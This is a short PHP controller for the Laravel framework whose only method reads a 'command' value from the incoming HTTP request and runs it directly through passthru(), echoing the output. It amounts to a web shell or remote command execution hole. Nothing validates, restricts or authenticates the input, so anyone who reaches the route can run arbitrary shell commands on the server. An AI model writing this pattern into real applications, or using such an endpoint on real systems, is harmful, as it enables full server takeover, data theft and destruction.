<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;

class ConsoleController extends Controller
{
    public function execute(Request $request)
    {
        $command = $request->command;
        $last_line = passthru($command, $retval);
        echo $last_line;
    }
}
